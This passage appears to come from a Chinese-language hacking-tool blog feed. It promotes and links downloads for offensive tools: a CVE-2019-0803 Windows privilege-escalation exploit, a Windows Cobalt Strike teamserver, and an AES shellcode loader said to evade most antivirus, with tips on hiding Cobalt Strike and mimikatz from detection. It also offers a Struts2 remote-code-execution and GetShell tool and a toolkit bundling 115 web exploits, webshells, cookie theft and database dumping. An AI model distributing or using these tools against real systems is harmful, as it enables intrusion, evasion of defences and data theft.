<h3 id="Ladon执行PowerShell"><a href="#Ladon执行PowerShell" class="headerlink" title="Ladon执行PowerShell"></a>Ladon执行PowerShell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mono Ladon 123456 test.ps1</span><br></pre></td></tr></table></figure>

<p>Kali 2019.4 x64<br><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_ps1.PNG"></p>
<p>Ubuntu 18.04 x64<br><img alt data-original="http://k8gege.org/k8img/Ladon/ubuntu/ub_ps1.PNG"></p>
<h3 id="Windows绕过PowerShell限制"><a href="#Windows绕过PowerShell限制" class="headerlink" title="Windows绕过PowerShell限制"></a>Windows绕过PowerShell限制</h3><p>使用Ladon执行，就不存在PowerShell默认禁止执行脚本的限制<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/win_ps1.PNG"></p>
<h3 id="自定义PowerShell脚本"><a href="#自定义PowerShell脚本" class="headerlink" title="自定义PowerShell脚本"></a>自定义PowerShell脚本</h3><p>其它功能脚本通过以下函数调用即可，或者返回空值的Ladon函数调用代码。<br>如Base64批量密码解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Ladon ()&#123;</span><br><span class="line">param([string]$ip) </span><br><span class="line">$pass&#x3D;ConvertFrom-Base64String($ip)</span><br><span class="line">$result&#x3D;-Join($ip,&quot; &quot;,$pass)</span><br><span class="line">return $result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Convert base64 string to string</span><br><span class="line">function ConvertFrom-Base64String([string]$string)</span><br><span class="line">&#123;</span><br><span class="line">    $byteArray &#x3D; [Convert]::FromBase64String($string)</span><br><span class="line">    [System.Text.UnicodeEncoding]::UTF8.GetString($byteArray)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关于-net跨平台"><a href="#关于-net跨平台" class="headerlink" title="关于.net跨平台"></a>关于.net跨平台</h3><p>关于.net跨平台有两个选择，一是mono，二是.net core，都是微软出品<br>三是PowerShell Core(内嵌.net，linux下未测，毕竟默认无.net运行库)</p>
<p>完全脱离运行库编译程序都很大，好在mono运行库安装比PY、JAVA都要快<br>仅需一两分钟，也就是说，假如需要在目标执行，还可以只传一个小程序<br>不像Python和Java安装了运行库，需要运行程序可能还得安装其它依赖库<br>意味着有些程序离开开发环境可能无法运行(有些系统一些模块根本装不上)<br>同样存在着兼容性问题，从奇葩环境看似乎.net比py和java有着更大优势<br>需要将程序上传至目标，意味着可能出不了网或无法代理等奇葩网络环境。<br>我这里考虑的都是极差环境，只代理就顺利使用相关工具的永远体会不到。<br>当然有些功能PYTHON实现会比.NET简单很多倍，且.net可能还实现不了。<br>反过来也一样有些功能.NET，我不像别人喜欢哪门语言就无脑地吹哪门，<br>有缺点不肯承认还要强制说好，你和他说PY有什么缺点就像骂了他一样。<br>我从不否认任何语言的优点和缺点，因为任何语言只要工作需要我就用。<br>常用.net，无非是程序小这个巨大优势，程序小产生的流量自然就很小。<br>使用再垃圾的远控或者再垃圾的网络环境都有办法把程序传到目标机器。<br>如果远控或WebShell像Cobal Strike一样支持内存加载，就更不用担心。</p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Kali</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0803提权工具</title>
    <url>/p/fa25cc9b.html</url>
    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x000 漏洞信息</strong></span><br>CVE-2019-0803 | Win32k 特权提升漏洞<br>发布时间: 2019-04-09<br>当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。<br>若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
<p><span style="font-size: 18px;"><strong>0x001 影响版本</strong></span></p>
<div class="cnblogs_Highlighter">
<pre class="brush:csharp;gutter:true;">Microsoft Windows Server 2019 0
Microsoft Windows Server 2016 0
Microsoft Windows Server 2012 R2 0
Microsoft Windows Server 2012 0
Microsoft Windows Server 2008 R2 for x64-based Systems SP1
Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
Microsoft Windows Server 2008 for x64-based Systems SP2
Microsoft Windows Server 2008 for Itanium-based Systems SP2
Microsoft Windows Server 2008 for 32-bit Systems SP2
Microsoft Windows Server 1803 0
Microsoft Windows Server 1709 0
Microsoft Windows RT 8.1
Microsoft Windows 8.1 for x64-based Systems 0
Microsoft Windows 8.1 for 32-bit Systems 0
Microsoft Windows 7 for x64-based Systems SP1
Microsoft Windows 7 for 32-bit Systems SP1
Microsoft Windows 10 Version 1809 for x64-based Systems 0
Microsoft Windows 10 Version 1809 for ARM64-based Systems 0
Microsoft Windows 10 Version 1809 for 32-bit Systems 0
Microsoft Windows 10 Version 1803 for x64-based Systems 0
Microsoft Windows 10 Version 1803 for ARM64-based Systems 0
Microsoft Windows 10 Version 1803 for 32-bit Systems 0
Microsoft Windows 10 version 1709 for x64-based Systems 0
Microsoft Windows 10 Version 1709 for ARM64-based Systems 0
Microsoft Windows 10 version 1709 for 32-bit Systems 0
Microsoft Windows 10 version 1703 for x64-based Systems 0
Microsoft Windows 10 version 1703 for 32-bit Systems 0
Microsoft Windows 10 Version 1607 for x64-based Systems 0
Microsoft Windows 10 Version 1607 for 32-bit Systems 0
Microsoft Windows 10 for x64-based Systems 0
Microsoft Windows 10 for 32-bit Systems 0
</pre>
</div>
<p><span style="font-size: 18px;"><strong>&nbsp;0x002 EXP用法</strong></span></p>
<div class="cnblogs_Highlighter">
<pre class="brush:csharp;gutter:true;">Usage:  CVE-2019-0803.exe cmd cmdline
</pre>
</div>
<p>如图：可能需执行3-4次左右才能提权成功,测试系统为Win7 X64,其它未测。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0803.png"></p>
<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x003 下载</span></strong></span></p>
<p>https://github.com/k8gege/K8tools</p>
<p><span style="font-size: 18px;"><strong>0x004 补丁</strong></span></p>
<p>补丁号有很多个，不同的系统补丁号不一样，有时新的补丁包含旧洞补丁</p>
<p>旧的补丁号会被替换掉，所以每次提权都应该先到官方查看下对应补丁号</p>
<p>不要老是查询有没旧的补丁号，然后再去提权，没有旧的补丁号不代表没补</p>
<p><a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803</a></p>
<p><span style="font-size: 18px;"><strong>0x005 链接</strong></span></p>
<p><a href="https://www.exploit-db.com/exploits/46920" target="_blank">https://www.exploit-db.com/exploits/46920</a><br>(steal Security token) <a href="https://github.com/mwrlabs/CVE-2016-7255" target="_blank">https://github.com/mwrlabs/CVE-2016-7255</a><br>EDB Note: Download ~ <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip" target="_blank">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip</a></p>
<p><a title="External url" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803</a> <br>                    



<pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
      <categories>
        <category>提权</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>LPE</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike TeamServer For Windows</title>
    <url>/p/22e5f4a8.html</url>
    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
<p><strong>0x003 下载</strong></p>
<p>TeamServer.exe</p>
<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
      <categories>
        <category>工具</category>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
    <url>/p/9cffe32c.html</url>
    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
<p>&nbsp;</p>
<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
      <categories>
        <category>工具</category>
        <category>免杀</category>
        <category>Metasploit</category>
        <category>Cobalt Strike</category>
        <category>ShellCode</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Cobalt Strike</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>K8 Struts2 EXP 综合漏洞利用工具</title>
    <url>/p/ab3e87f7.html</url>
    <content><![CDATA[<p>工具:&nbsp;K8&nbsp;Struts2&nbsp;Exploit<br>组织:&nbsp;K8搞基大队[K8team]<br>作者:&nbsp;K8拉登哥哥<br>博客:&nbsp;<a href="http://qqhack8.blog.163.com" target="_blank">http://qqhack8.blog.163.com</a><br>发布:&nbsp;2014/7/31&nbsp;10:24:56<br><br>简介: <br><br>K8 Struts2 综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)<br>Struts2漏洞检测工具&nbsp;&nbsp; Struts2漏洞测试工具&nbsp; K8 struts2 exploit Test&nbsp; Struts2 GetShell<br>支持漏洞 (S2-045 devMode S2-032&nbsp; s2-020&nbsp; s2-019&nbsp; s2-016&nbsp; s2-013&nbsp; s2-009 S2-005)&nbsp; <br><br>声明:工具仅供安全检测或网络攻防研究,非法用途后果自负.<br>图片: <br><img alt data-original="http://k8gege.org/k8img/posts/S2exp1.png"></p>
<div>
<div>&nbsp;</div>





<p>新增任意文件上传<br></p>
<div><img alt data-original="http://k8gege.org/k8img/posts/S2exp2.png"></div>





<p>&nbsp;</p></div><p></p>
<div>
<div>
<div>&nbsp;</div>





</div>





</div>
<p>
功能:&nbsp;<br>===========================================================================================<br>[+]新增任意文件上传小马 (解决S2奇葩环境菜刀无法上传文件 &amp; 乱码问题)<br>[+]10 S2-045&nbsp; CVE-2017-5638&nbsp;&nbsp; 支持执行CMD命令<br>[+]9 devMode CVE-xxxx-xxxx&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]8 S2-037&nbsp; CVE-2016-4438&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]7 S2-032&nbsp; CVE-2016-3081&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]6 S2-020&nbsp; CVE-2014-0094&nbsp;&nbsp; 支持GetShell (此洞特殊,EXP集成在飞刀)<br>[+]5 S2-019&nbsp; CVE-2013-4316&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]4 S2-016&nbsp; CVE-2013-2251&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]3 S2-013&nbsp; CVE-2013-1966&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]2 S2-009&nbsp; CVE-2011-3923&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]1 S2-005&nbsp; CVE-2010-1870&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令/列文件目录<br>===========================================================================================<br>CVE-2016-4438&nbsp; 影响版本：Struts 2.3.20 - Struts 2.3.28.1&nbsp; 官方公告：http://struts.apache.org/docs/s2-037.html<br>CVE-2016-3081&nbsp; 影响版本：Struts 2.3.18 &ndash; Struts 2.3.28&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-032.html<br>CVE-2014-0094&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.16&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-020.html<br>CVE-2013-4316&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15.1&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-019.html<br>CVE-2013-2251&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-016.html<br>CVE-2013-1966&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.14&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-013.html<br>CVE-2011-3923&nbsp; 影响版本：Struts 2.0.0 -&nbsp; Struts 2.3.1.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-009.html<br>CVE-2010-1870&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.1.8.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.2.x/docs/s2-005.html<br>===========================================================================================<br><br><span style="color: #ff00ff;">下载地址:</span><br>文件: K8_Struts2_EXP.exe<br>SHA1:3DAF7AD4FB7440C33E66613E6075A0F02EA9DF18<br>平台:&nbsp;XP/Vista/Win7/Win8/2000/2003/2008/2012<br>猛击:<a href="http://pan.baidu.com/s/1cpcQeE" rel="nofollow" target="_blank">http://pan.baidu.com/s/1cpcQeE</a><br><br><a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/k8gege/p/10261217.html" target="_blank" rel="noopener">[原创]Struts2奇葩环境任意文件上传工具(解决菜刀无法传文件或上传乱码等问题)</a><br>https://www.cnblogs.com/k8gege/p/10261217.html</p>]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>Struts2</tag>
        <tag>GetShell</tag>
      </tags>
  </entry>
  <entry>
    <title>K8飞刀Final</title>
    <url>/p/de1a82bb.html</url>
    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/k8fly/k8fly.png"></p>
<p><strong>法律声明:</strong> 工具仅供安全研究或授权渗透，非法用途后果自负。<br><br><strong>工具:</strong> K8飞刀Final<br><strong>作者:</strong> K8哥哥<br><strong>博客:</strong> https://www.cnblogs.com/k8gege<br><strong>简介:</strong> 一款多功能网络安全渗透测试工具(Hacker Swiss Army Knife)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.漏洞利用：&nbsp;&nbsp; 已集成20个主流WEB、CMS程序,累计115个EXP（如Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.后台扫描：&nbsp;&nbsp; 后台管理、登陆地址、木马地址、数据等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.域名扫描：&nbsp;&nbsp; 子域名扫描、二级域名扫描、WP用户扫描<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.黑客浏览器： 自动检测SQL注入、比FireFox扩展HackBar更强更全的HTTP参数提交(见EXP调式)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.EXP 调式：&nbsp;&nbsp; 支持Get/Post/Cookie/UserAgent/Referer/X-Forwarded-For/Client-IP/VIA提交&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6.生成 EXP：&nbsp;&nbsp; 可将调式好的EXP生成工具，无需编程功底即可实现EXP或直接加入飞刀漏洞利用库<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7.加密算法：&nbsp;&nbsp; MD5(16)、MD5(32)、SHA1、SHA256、SHA384、SHA512&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8.加密解密：&nbsp;&nbsp; Base32、Base64、Base64(SHA1)支持批量加密解密、DeDe密码、VNC密码、进制转换<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9.编码转换：&nbsp;&nbsp; Hex(16进制)、URL编码、ASCII码、ASCII码转其它、Unicode转ANSI、ANSI转Unicode&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.文件转换：&nbsp; Hex2File、Hex2Bin、Bin2Hex、File2Hex（可读取任意文件比如EXE或Shellcode）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11.SQL编码：&nbsp;&nbsp; SQL注入专用CHAR以及HEX路径转换(MSSQL、Mysql、Oracle等数据库)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12.XSS编码：&nbsp;&nbsp; JS_HEX、JS_Unicode、JS_Escape、FromCharCode、HTML实体加密解密<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13.Shell管理： 支持7种WebShell(ASP/PHP/JSP/ASPX/CFM/PYTHON/PERL)，多协议连接(仅CMD)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14.CookieHK：&nbsp; 读取当前登陆站点Cookie(支持httponly)、可使用Cookie直接登陆后台<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15.WebShell：&nbsp; 内置飞刀专用一句话(UA或其它格式一句话可过大量杀软及WAF防火墙)&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16.Hacking：&nbsp;&nbsp; VBS随机加密免杀、GetShell、0day网马、硬件BadUSB(Teensy下载者)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17.脱库工具：&nbsp; 注入点脱库工具、支持自定义关键字或正则提取数据、可采集URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18.GoogleHK：&nbsp; 批量抓取URL、批量检测注入、批量GetShell、批量执行自定义EXP<br><br><strong>最终版</strong>：由于加密硬盘损坏部分飞刀等工具源码无法恢复,2017年底已无法更新飞刀主程序,但很多功能长期可用,漏洞利用库可加EXP<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 朋友们不用再问我要最新版了,没发现我已经差不2两年没更新了，和2012年的一个工具一样,不是我不更新,而是无法更新了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加密的源码损坏某个地方，就会导致整个文件无法解密，何况经过两层加密（一层硬盘加密，一层源码加密，源码外还有TC）</p>
<p><strong>下载地址：</strong><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8%E9%A3%9E%E5%88%80Final.rar</a></p>
<p><strong>思维导图:</strong>&nbsp; <a href="https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png" target="_blank">https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png</a></p>
<p><strong>更新历史</strong><br>=================================================================================<br>K8飞刀 20170920<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VNC密码加密解密（RealVNC、Tightvnc等)&nbsp;&nbsp;&nbsp;&nbsp; 20170920<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(下载文件到服务器命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170426<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(UA Aspx一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASP&nbsp; UA CmdShell(UA Asp一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 历史执行命令(文本下拉框&amp;上下方向键控制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64(SHA1)批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base32--批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>K8飞刀 20160613<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Hex)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Dec)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2PleskHex(Plesk密码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2RegHex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--RegHex2Hex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2File(Hex转Bin文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>=================================================================================<br>K8飞刀 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell--ImageMagick命令执行EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--计算机存储单位换算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160505<br>=================================================================================<br>K8飞刀 20160414<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 漏洞利用库EXP 支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160413<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成EXE漏洞EXP支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2Bin(Hex转文件含空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2File(Hex转文件非空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion JRun LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7b LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7a LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 6 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 8 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键查看EXP漏洞库列表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 